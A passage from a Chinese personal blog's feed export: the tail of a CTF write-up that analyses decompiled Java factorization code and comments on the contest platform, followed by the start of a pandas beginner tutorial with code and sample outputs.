number">150</span><span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    BigInteger T <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    BigInteger t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    BigInteger t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">mod</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">mod</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>BigInteger<span class="token punctuation">.</span>ONE<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      BigInteger d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>BigInteger<span class="token punctuation">.</span>ONE<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">mod</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>BigInteger<span class="token punctuation">.</span>ZERO<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>BigInteger j <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> d<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">;</span> j<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>BigInteger<span class="token punctuation">.</span>ONE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>d<span class="token punctuation">.</span><span class="token function">mod</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>BigInteger<span class="token punctuation">.</span>ZERO<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Integer<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            j <span class="token operator">=</span> j<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span>BigInteger<span class="token punctuation">.</span>ONE<span class="token punctuation">)</span><span class="token punctuation">;</span>            d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Integer<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> BigInteger <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    Set<span class="token operator">&lt;</span>BigInteger<span class="token operator">></span> p <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>m<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Stack<span class="token operator">&lt;</span>BigInteger<span class="token operator">></span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    BigInteger d <span class="token operator">=</span> BigInteger<span class="token punctuation">.</span>ONE<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>BigInteger q <span class="token operator">:</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>      o<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BigInteger<span class="token punctuation">)</span>o<span class="token punctuation">.</span><span class="token function">elementAt</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BigInteger<span class="token punctuation">)</span>o<span class="token punctuation">.</span><span class="token function">elementAt</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> d<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">Lib</span><span class="token punctuation">(</span>String num<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>看最下面的函数，首先 b 为输入的数字，m为一个 HashMap（不是很懂？</p><p><code>f()</code>函数先是不断让 b/2 直到 b mod 2 == 0，然后把这时的 2 和索引 i 放入 m；之后同理让 b/3，把 3 和索引 i 放入 m。</p><p><code>s()</code>函数……</p><p><em>（做到这里后面有事就没看下去了</em></p><p>蹲个大佬的 WP 看看。</p><br><hr><h2 id="其他题"><a href="#其他题" class="headerlink" title="其他题"></a>其他题</h2><p>这次还有挺多有意思的题目吧。</p><p>比如 Misc 有道 Minecraft 的题目，看截图还有红石电路的，不过倒是没人做出来罢了。</p><p>Reverse 里有个 <code>R_E_5_E_T.exe</code> 是用 VB 写的，神器 IDA 就直接用不了了，貌似还加了壳，给了一堆 hint 然而并不会做。</p><p>有道题 <code>are-you-a-fan</code> 用了一堆位运算，hint 是 NAND（数电里的？），哇呜难顶。</p><p>Crypto 里有个 <code>EzRSA</code>，文件名是 <code>difficultrsa.py</code>，噢暴露真相了2333。</p><p>到最后还出了 OI 的题<em>（没玩过，再见）</em>……目睹了问号<code>？</code>大佬疯狂秒题，？？？</p><br><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次比赛平台是用 docker 部署的 CTFd，上了动态 flag 和独立环境，从这个角度而言做题感受挺好的。只是独立环境直接绑定到了同一个域名 ha1cyon-ctf.fun 下的不同端口，不像之前见过的动态域名，可能比较容易被扫描，从而容易被攻击吧（猜的。</p><p>看了一下平台是直接用 Gunicorn 搭建的 web 服务就上公网了，没套 Nginx 之类的反代，也没加 WAF 来着。不过没怎么了解也不大清楚 Gunicorn 应对高并发的能力如何。</p><p>总体感觉这次 CTF <del>运维赛</del> <strong>题目好多啊，难度好大啊，基本没见过的套路呢</strong>。题目质量还不错，就是啥都不会，嘤嘤嘤。</p><p>虽说算是业余玩玩的，但也想好好学点东西呢。</p><p>看了大佬们的WP，膜一波。</p><p>顺便再膜一下用学生机灵活应对高并发的运维大佬。</p><br><hr><p>周日还打了个虎符 CTF（<strong>2020数字中国创新大赛-虎符网络安全赛道</strong>），发现题目大都新鲜出炉的。果然爆零，题目做到自闭。。</p><p>Misc 题一堆密码题，哇呜不会做……</p><p>有道 python 逆向题<code>disasm</code>，给了对字节码反编译后得到的代码（可以利用<code>dis.dis</code>帮助分析），哇第一次看到了 python 的底层实现，真就和汇编差不多，感觉挺能帮助理解 Py 原理的。看了几篇文章了解了一下，然而手动逆向到自闭都没分析不完，最后就放弃了。</p><p><a href="http://qingyunha.github.io/taotao/" target="_blank" rel="noopener">A Python Interpreter Written in Python</a></p><p><a href="https://zhuanlan.zhihu.com/p/45101508" target="_blank" rel="noopener">死磕python字节码-手工还原python源码</a></p><p>Web 题用 nodejs 伪造 PHP 可还行，然而真好，都是我不会的。</p><p>不写了不写了。</p><p>等后面有机会再来复现吧。</p><p><em>（溜了溜了</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据科学 | 十分钟入门pandas/常用方法笔记</title>
      <link href="/2020/04/17/DataScience_10MinutesToPandas/"/>
      <url>/2020/04/17/DataScience_10MinutesToPandas/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/04/17/DataScience_10MinutesToPandas/pandas.jpg" alt="pandas"></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近对<strong>数据科学</strong>有点感兴趣，众所周知，在 python 中用来做数据处理常用的有 numpy、pandas 等模块，它们功能非常强大。</p><p>考虑到有项目正好要用到 pandas，这次就来学一下吧。<small><em>（挺久之前就想学的，一直咕</em></small></p><p>看到网上推荐了官方的 <a href="https://pandas.pydata.org/pandas-docs/version/0.22.0/10min.html" target="_blank" rel="noopener">10 Minutes to pandas</a>，就去看了一下，翻译了一下官方的教程，自己跑了代码，顺便再记了点笔记吧。</p><p>下面的内容主要参考的是<em>10 Minutes to pandas</em>（<del>然而看了一晚上</del>），运行环境为 <strong>Jupyter Notebook</strong>。</p><p>这篇博客也是在从 Jupyter Notebook 里导出的 markdown 基础上完成的，挺方便的呢。（有些地方可能由于博客样式的原因显示会有点问题，凑合着看一看吧。</p><p><del>后面有空再整理一下</del>，放个 Jupyter Notebook 的<code>.ipynb</code>版本吧。</p><p><strong>—-&gt;详见文末的更新！</strong></p><br><h2 id="0x01-导入模块"><a href="#0x01-导入模块" class="headerlink" title="0x01 导入模块"></a>0x01 导入模块</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np</code></pre><p>这些都是常用别名了呢（</p><h2 id="0x02-创建对象-Object-Creation"><a href="#0x02-创建对象-Object-Creation" class="headerlink" title="0x02 创建对象 Object Creation"></a>0x02 创建对象 Object Creation</h2><p>传递一个list对象来创建一个Series，pandas会默认创建整型索引(index)。</p><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>s</code></pre><pre><code>0    1.01    3.02    5.03    NaN4    6.05    8.0dtype: float64</code></pre><p>传递一个numpy array，时间索引以及列标签来创建一个DataFrame</p><pre class=" language-python"><code class="language-python">dates <span class="token operator">=</span> pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'20200416'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span>dates</code></pre><pre><code>DatetimeIndex(['2020-04-16', '2020-04-17', '2020-04-18', '2020-04-19',               '2020-04-20', '2020-04-21'],              dtype='datetime64[ns]', freq='D')</code></pre><pre class=" language-python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token operator">=</span>dates<span class="token punctuation">,</span> columns<span class="token operator">=</span>list<span class="token punctuation">(</span><span class="token string">'ABCD'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><p>传递一个能够被转换成类似序列结构的字典对象来创建一个DataFrame</p><pre class=" language-python"><code class="language-python">df2 <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string">'A'</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token string">'B'</span> <span class="token punctuation">:</span> pd<span class="token punctuation">.</span>Timestamp<span class="token punctuation">(</span><span class="token string">'20200416183800'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'C'</span> <span class="token punctuation">:</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>index<span class="token operator">=</span>list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span><span class="token string">'float32'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'D'</span> <span class="token punctuation">:</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span><span class="token string">'int32'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'E'</span> <span class="token punctuation">:</span> pd<span class="token punctuation">.</span>Categorical<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"test"</span><span class="token punctuation">,</span><span class="token string">"train"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">,</span><span class="token string">"train"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'F'</span> <span class="token punctuation">:</span> <span class="token string">'foo'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>df2</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>E</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>1.0</td>      <td>2020-04-16 18:38:00</td>      <td>1.0</td>      <td>3</td>      <td>test</td>      <td>foo</td>    </tr>    <tr>      <th>1</th>      <td>1.0</td>      <td>2020-04-16 18:38:00</td>      <td>1.0</td>      <td>3</td>      <td>train</td>      <td>foo</td>    </tr>    <tr>      <th>2</th>      <td>1.0</td>      <td>2020-04-16 18:38:00</td>      <td>1.0</td>      <td>3</td>      <td>test</td>      <td>foo</td>    </tr>    <tr>      <th>3</th>      <td>1.0</td>      <td>2020-04-16 18:38:00</td>      <td>1.0</td>      <td>3</td>      <td>train</td>      <td>foo</td>    </tr>  </tbody></table></div><p>查看他们的数据类型(dtypes).</p><pre class=" language-python"><code class="language-python">df2<span class="token punctuation">.</span>dtypes</code></pre><pre><code>A           float64B    datetime64[ns]C           float32D             int32E          categoryF            objectdtype: object</code></pre><p>在 IPython 里输入 <code>df2.</code>，按下 TAB 键，会有常用的代码提示。</p><p>这里我是在 Jupyter Notebook 中跑，也有类似效果。为了方便展示这里用<code>dir</code>来列出来吧。</p><pre class=" language-python"><code class="language-python">dir<span class="token punctuation">(</span>df2<span class="token punctuation">)</span></code></pre><pre><code>['A', 'B', 'C', 'D', 'E', 'F', 'T', ######################...########### 'to_feather', 'to_gbq', 'to_hdf', 'to_html', 'to_json', 'to_latex', 'to_msgpack', 'to_numpy', 'to_panel', 'to_parquet', 'to_period', 'to_pickle', 'to_records', 'to_sparse', 'to_sql', 'to_stata', 'to_string', 'to_timestamp', 'to_xarray', 'transform', 'transpose', 'truediv', 'truncate', 'tshift', 'tz_convert', 'tz_localize', 'unstack', 'update', 'values', 'var', 'where', 'xs']</code></pre><h2 id="0x03-查看数据-Viewing-Data"><a href="#0x03-查看数据-Viewing-Data" class="headerlink" title="0x03 查看数据 Viewing Data"></a>0x03 查看数据 Viewing Data</h2><p>查看 frame 中头部和尾部的行</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 查看前五行数据</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 前两行</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>tail<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 倒数三行</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><p>显示索引、列和底层的(underlying) numpy 数据</p><pre class=" language-python"><code class="language-python">df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>index</code></pre><pre><code>DatetimeIndex(['2020-04-16', '2020-04-17', '2020-04-18', '2020-04-19',               '2020-04-20', '2020-04-21'],              dtype='datetime64[ns]', freq='D')</code></pre><pre class=" language-python"><code class="language-python">df2<span class="token punctuation">.</span>index</code></pre><pre><code>Int64Index([0, 1, 2, 3], dtype='int64')</code></pre><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>columns</code></pre><pre><code>Index(['A', 'B', 'C', 'D'], dtype='object')</code></pre><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>values</code></pre><pre><code>array([[-0.22808386,  0.71252123,  0.74337822,  0.52682341],       [-0.42392275,  0.56434629, -2.31893066,  0.08093058],       [-2.03224294,  2.04682736,  1.17661398, -0.3655562 ],       [-1.20000469,  1.10999124, -1.52780407,  1.06864157],       [-0.53503099,  1.35142044,  0.90786509, -1.07401348],       [-0.61473412,  0.02714293, -0.42087502, -0.33381946]])</code></pre><pre class=" language-python"><code class="language-python">df2<span class="token punctuation">.</span>values</code></pre><pre><code>array([[1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'test', 'foo'],       [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'train', 'foo'],       [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'test', 'foo'],       [1.0, Timestamp('2020-04-16 18:38:00'), 1.0, 3, 'train', 'foo']],      dtype=object)</code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>df<span class="token punctuation">.</span>columns<span class="token 